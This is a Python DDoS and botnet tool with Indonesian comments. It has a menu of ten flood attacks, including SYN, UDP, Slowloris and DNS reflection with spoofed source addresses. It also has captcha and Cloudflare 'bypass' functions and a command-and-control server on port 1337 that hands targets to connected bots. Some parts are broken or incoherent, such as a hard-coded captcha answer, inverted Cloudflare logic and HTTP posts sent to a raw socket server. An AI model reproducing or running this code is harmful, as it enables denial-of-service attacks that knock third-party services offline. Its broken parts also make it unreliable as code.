import socket
import threading
import random
import time
import string
import requests
import ftplib
from scapy.all import DNSQR,IP,UDP,DNS,TCP,conf,send

# Implementasi untuk melewati captcha (Hanya sebagai contoh, sebaiknya tidak digunakan dalam lingkungan nyata)
def bypass_captcha_attack(target_url):
    # Implementasi untuk melewati captcha akan ditambahkan di sini
    # Berikut adalah contoh implementasi sederhana untuk tujuan ilustrasi saja
    captcha_bypassed = False

    # Lakukan proses bypass captcha di sini (contoh: menggunakan Selenium untuk mengisi captcha secara otomatis)
    # Anda harus menyesuaikan kode ini dengan mekanisme captcha yang ingin dilewati
    try:
        from selenium import webdriver
        from selenium.webdriver.common.keys import Keys
        from selenium.webdriver.chrome.options import Options

        # Pengaturan opsi untuk menjalankan browser headless (tanpa GUI)
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--disable-gpu")

        # Buat instance driver browser Chrome
        driver = webdriver.Chrome(options=chrome_options)

        # Buka halaman target_url
        driver.get(target_url)

        # Cari elemen captcha dan isi dengan jawaban yang tepat (contoh: isi teks captcha dengan "12345")
        captcha_element = driver.find_element_by_id("captcha_input")
        captcha_element.send_keys("12345")
        captcha_element.send_keys(Keys.ENTER)

        # Pastikan captcha berhasil dilewati
        if "captcha_success" in driver.page_source:
            captcha_bypassed = True

        # Tutup browser
        driver.quit()

    except Exception as e:
        # Jika terjadi kesalahan selama proses bypass captcha, tangani di sini
        print("Terjadi kesalahan saat melewati captcha:", str(e))

    # Kembalikan hasil status apakah captcha berhasil dilewati atau tidak
    return captcha_bypassed

def bypass_cloudflare_protection(target_url):
    # Implementasi untuk melewati Cloudflare protection akan ditambahkan di sini
    # Berikut adalah contoh implementasi sederhana untuk tujuan ilustrasi saja
    try:
        import requests

        # Menggunakan User-Agent acak untuk menyamar sebagai browser
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
        }

        # Mengirim permintaan HTTP menggunakan library requests
        response = requests.get(target_url, headers=headers)

        # Jika respons berisi halaman Cloudflare Challenge
        if "Checking your browser before accessing" in response.text:
            print("Cloudflare protection berhasil dilewati.")
        else:
            print("Cloudflare protection tidak berhasil dilewati.")

    except Exception as e:
        # Jika terjadi kesalahan selama proses melewati Cloudflare protection, tangani di sini
        print("Terjadi kesalahan saat melewati Cloudflare protection:", str(e))




# Fungsi untuk menghasilkan User-Agent acak
def generate_random_user_agent():
    return "Mozilla/5.0 (Windows NT " + str(random.randint(5, 10)) + "." + str(random.randint(0, 4)) + "; " + \
           "Win" + str(random.choice(['64', '32'])) + "; " + \
           "x64; rv:80.0) " + \
           "Gecko/20100101 " + \
           "".join(random.choices(string.ascii_lowercase, k=random.randint(5, 10))) + "/" + \
           str(random.randint(2010, 2021)) + " " + \
           "".join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))

# Fungsi untuk melakukan HTTP Flood
def perform_http_flood(target_ip, target_port, cnc_server, stealth_mode=False, proxies=None):
    headers = {'User-Agent': generate_random_user_agent()}

    spoofed_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}

    while True:
        try:
            headers['User-Agent'] = random.choice([headers['User-Agent'], spoofed_headers['User-Agent']])
            proxy = random.choice(proxies) if proxies else None
            requests.get(f"http://{target_ip}:{target_port}", headers=headers, proxies=proxy, timeout=5)
            if cnc_server and not stealth_mode:
                cnc_server.send(b"Serangan berhasil")
        except:
            if cnc_server and not stealth_mode:
                cnc_server.send(b"Serangan gagal")
            pass

# Fungsi untuk melakukan TCP Flood
def perform_tcp_flood(target_ip, target_port, cnc_server, stealth_mode=False, proxies=None):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            proxy = random.choice(proxies) if proxies else None
            if proxy:
                client.connect(proxy)
            else:
                client.connect((target_ip, target_port))
            if cnc_server and not stealth_mode:
                cnc_server.send(b"Serangan berhasil")
        except:
            if cnc_server and not stealth_mode:
                cnc_server.send(b"Serangan gagal")
            pass

# Fungsi untuk melakukan UDP Flood
def perform_udp_flood(target_ip, target_port, cnc_server, stealth_mode=False, proxies=None):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            proxy = random.choice(proxies) if proxies else None
            client.sendto(b"", (proxy or target_ip, target_port))
            if cnc_server and not stealth_mode:
                cnc_server.send(b"Serangan berhasil")
        except:
            if cnc_server and not stealth_mode:
                cnc_server.send(b"Serangan gagal")
            pass

# Fungsi untuk melakukan Random UDP Attack
def perform_random_udp_attack(target_ip, target_port, cnc_server, stealth_mode=False, proxies=None):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            payload = bytes([random.randint(0, 255) for _ in range(random.randint(1, 1024))])
            proxy = random.choice(proxies) if proxies else None
            client.sendto(payload, ((proxy or target_ip), target_port))
            if cnc_server and not stealth_mode:
                cnc_server.send(b"Serangan berhasil")
        except:
            if cnc_server and not stealth_mode:
                cnc_server.send(b"Serangan gagal")
            pass

# Fungsi untuk melakukan DNS Reflection Attack
def perform_dns_reflection_attack(target_ip, target_port, cnc_server, stealth_mode=False, proxies=None):
    dns_server = "8.8.8.8"
    domain = "example.com"
    query = DNSQR(qname=domain, qtype="A")

    while True:
        try:
            source_ip = target_ip
            source_port = random.randint(1024, 65535)
            packet = IP(src=source_ip, dst=dns_server) / UDP(sport=source_port, dport=53) / DNS(rd=1, qd=query)
            proxy = random.choice(proxies) if proxies else None
            send(packet, verbose=False, socket=conf.L3socket(iface=proxy))

            if cnc_server and not stealth_mode:
                cnc_server.send(b"Serangan berhasil")
        except:
            if cnc_server and not stealth_mode:
                cnc_server.send(b"Serangan gagal")
            pass

# Fungsi untuk melakukan Layer 7 Attack (HTTP/TCP)
def perform_layer7_attack(target_ip, target_port, cnc_server, stealth_mode=False, proxies=None):
    while True:
        try:
            source_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            source_port = random.randint(1024, 65535)
            http_method = random.choice(['GET', 'POST'])
            http_request = f"{http_method} / HTTP/1.1\r\n"
            http_request += f"Host: {target_ip}\r\n"
            http_request += f"User-Agent: {generate_random_user_agent()}\r\n"
            http_request += "\r\n"

            proxy = random.choice(proxies) if proxies else None
            packet = IP(src=source_ip, dst=(proxy or target_ip)) / TCP(sport=source_port, dport=target_port) / http_request
            send(packet, verbose=False, iface=proxy)

            if cnc_server and not stealth_mode:
                cnc_server.send(b"Serangan berhasil")
        except:
            if cnc_server and not stealth_mode:
                cnc_server.send(b"Serangan gagal")
            pass

# Fungsi untuk melakukan Slowloris Attack
def perform_slowloris_attack(target_ip, target_port, cnc_server, stealth_mode=False, proxies=None):
    headers = [
        "User-Agent: " + generate_random_user_agent(),
        "Accept-language: en-US,en"
    ]

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            client.connect((target_ip, target_port))
            for header in headers:
                client.send(str.encode(header + "\r\n"))
            if cnc_server and not stealth_mode:
                cnc_server.send(b"Serangan berhasil")
        except:
            if cnc_server and not stealth_mode:
                cnc_server.send(b"Serangan gagal")
            pass

# Fungsi untuk melakukan SYN Flood
def perform_syn_flood(target_ip, target_port, cnc_server, stealth_mode=False, proxies=None):
    client = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    client.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    while True:
        try:
            source_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
            proxy = random.choice(proxies) if proxies else None
            send(packet, verbose=False, iface=proxy)

            if cnc_server and not stealth_mode:
                cnc_server.send(b"Serangan berhasil")
        except:
            if cnc_server and not stealth_mode:
                cnc_server.send(b"Serangan gagal")
            pass

# Fungsi untuk melakukan FTP Flood
def perform_ftp_flood(target_ip, target_port, username, password, num_connections):
    for _ in range(num_connections):
        try:
            ftp = ftplib.FTP()
            ftp.connect(target_ip, target_port)
            ftp.login(username, password)
            ftp.quit()
        except:
            pass

# Fungsi untuk melakukan SCTP Flood
def perform_sctp_flood(target_ip, target_port, num_connections):
    for _ in range(num_connections):
        try:
            sctp = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_SCTP)
            sctp.connect((target_ip, target_port))
            sctp.close()
        except:
            pass

# Fungsi untuk mencetak logo DDoS Attack
def print_ddos_logo():
    logo = r"""
  _____           _           ____  _           _ _
 |  __ \         (_)         |  _ \| |         (_) |
 | |__) |___  ___ _ _ __     | |_) | |_   _ ___ _| |_ ___ _ __
 |  _  // _ \/ __| | '_ \    |  _ <| | | | / __| | __/ _ \ '__|
 | | \ \  __/\__ \ | | | |   | |_) | | |_| \__ \ | ||  __/ |
 |_|  \_\___||___/_|_| |_|   |____/|_|\__,_|___/_|\__\___|_|

"""
    print(logo)

# Fungsi untuk menampilkan menu utama
def main_menu():
    print_ddos_logo()
    print("Pilih serangan yang ingin dilakukan:")
    print("1. HTTP Flood")
    print("2. TCP Flood")
    print("3. UDP Flood")
    print("4. Random UDP Attack")
    print("5. DNS Reflection Attack")
    print("6. Layer 7 Attack (HTTP/TCP)")
    print("7. Slowloris Attack")
    print("8. SYN Flood")
    print("9. FTP Flood")
    print("10. SCTP Flood")
    print("0. Keluar")

# Fungsi untuk memproses botnet handler
def handle_bot(cnc_server, bot_id, target_ip, target_port, num_threads, attack_type, proxies=None, stealth_mode=False):
    if attack_type == "1":
        perform_http_flood(target_ip, target_port, cnc_server, stealth_mode, proxies)
    elif attack_type == "2":
        perform_tcp_flood(target_ip, target_port, cnc_server, stealth_mode, proxies)
    elif attack_type == "3":
        perform_udp_flood(target_ip, target_port, cnc_server, stealth_mode, proxies)
    elif attack_type == "4":
        perform_random_udp_attack(target_ip, target_port, cnc_server, stealth_mode, proxies)
    elif attack_type == "5":
        perform_dns_reflection_attack(target_ip, target_port, cnc_server, stealth_mode, proxies)
    elif attack_type == "6":
        perform_layer7_attack(target_ip, target_port, cnc_server, stealth_mode, proxies)
    elif attack_type == "7":
        perform_slowloris_attack(target_ip, target_port, cnc_server, stealth_mode, proxies)
    elif attack_type == "8":
        perform_syn_flood(target_ip, target_port, cnc_server, stealth_mode, proxies)
    elif attack_type == "9":
        ftp_username = input("Masukkan username FTP: ")
        ftp_password = input("Masukkan password FTP: ")
        perform_ftp_flood(target_ip, target_port, ftp_username, ftp_password, num_threads)
    elif attack_type == "10":
        perform_sctp_flood(target_ip, target_port, num_threads)
    else:
        print("Serangan tidak dikenal.")

# Fungsi untuk memproses botnet server
def cnc_server_handler():
    bot_list = []

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 1337))
    server.listen(5)
    print("[CNC Server] Menunggu koneksi dari bot...")

    while True:
        try:
            bot, bot_address = server.accept()
            bot_id = len(bot_list) + 1
            bot_list.append(bot)
            print(f"[CNC Server] Bot {bot_id} terhubung: {bot_address}")

            target_ip = input("Masukkan alamat IP target: ")
            target_port = int(input("Masukkan port target: "))
            num_threads = int(input("Masukkan jumlah thread yang akan digunakan: "))
            attack_type = input("Masukkan jenis serangan (1-10): ")

            stealth_mode = input("Gunakan mode menyamar? (y/n): ").lower().startswith("y")
            use_proxies = input("Gunakan proxy? (y/n): ").lower().startswith("y")
            proxies = None
            if use_proxies:
                proxies = input("Masukkan daftar proxy dipisahkan oleh koma: ").split(",")

            bot_thread = threading.Thread(target=handle_bot, args=(bot, bot_id, target_ip, target_port, num_threads, attack_type, proxies, stealth_mode))
            bot_thread.start()
        except KeyboardInterrupt:
            print("[CNC Server] Menutup koneksi bot...")
            for bot in bot_list:
                bot.send(b"exit")
                bot.close()
            server.close()
            break

if __name__ == "__main__":
    cnc_server_thread = threading.Thread(target=cnc_server_handler)
    cnc_server_thread.start()

    while True:
        main_menu()
        choice = input("Pilihan Anda: ")

        if choice == "0":
            print("[CNC Server] Menutup koneksi bot...")
            requests.post("http://localhost:1337", data=b"exit")
            time.sleep(1)
            break

        requests.post("http://localhost:1337", data=choice.encode())

    cnc_server_thread.join()
